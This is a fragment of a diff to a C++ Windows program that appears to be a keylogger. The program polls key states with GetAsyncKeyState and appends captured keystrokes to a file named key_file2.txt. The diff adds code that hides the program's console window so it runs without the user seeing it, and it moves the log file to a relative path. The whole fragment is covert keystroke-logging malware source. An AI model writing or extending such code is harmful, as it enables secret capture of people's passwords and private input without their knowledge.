@@ -16,6 +16,10 @@ int main(){
 
   afile.open("C:\\key_file2.txt", ios::in | ios::out);
   afile.close();
+  HWND window;
+    AllocConsole();
+    window = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(window, 0);
   
  
 
@@ -48,7 +52,7 @@ int main(){
 
 int keys(char key, fstream& file){
 
-  file.open("C:\\key_file2.txt", ios::app | ios::in | ios::out);
+  file.open("key_file2.txt", ios::app | ios::in | ios::out);
   if(file){
     if(GetAsyncKeyState(VK_SHIFT)){
       file << "[^]";
